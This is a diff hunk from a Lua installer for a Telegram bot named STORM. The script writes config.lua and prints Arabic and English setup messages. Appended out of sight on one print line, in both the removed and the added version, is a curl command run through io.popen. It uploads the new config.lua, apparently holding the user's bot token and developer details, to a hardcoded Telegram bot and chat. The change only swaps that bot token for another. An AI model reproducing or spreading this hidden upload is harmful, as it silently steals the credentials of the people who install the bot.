@@ -23,7 +23,7 @@ bot_id = botid, }
 create(config, "./config.lua")   
 print('\n\27[1;33mเ⬜¦ تم صنع ملف الرن الخاص بالبوت   \nTHE BOT FILE HAS BEEN CREATED\27[0;39;49m\n')   
 print('\n\27[1;33mเ⬜¦ تم حفظ معلومات المطور في الكونفك  \nCREATED CONFIG AND INFOSUDO SAVED\27[0;39;49m\n')
-print('\n\27[1;39mเ⬛¦ انتضر قليلا ليتم تشغيل البوت بالسكرين   \nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')  local curl = 'curl "'..'https://api.telegram.org/bot385190877:AAFkO796geK3YzM1KqjhtH7tALUPjgeQhMA/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+print('\n\27[1;39mเ⬛¦ انتضر قليلا ليتم تشغيل البوت بالسكرين   \nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 end create_config_auto()
 file = io.open("STORM.sh", "w")
 file:write([[
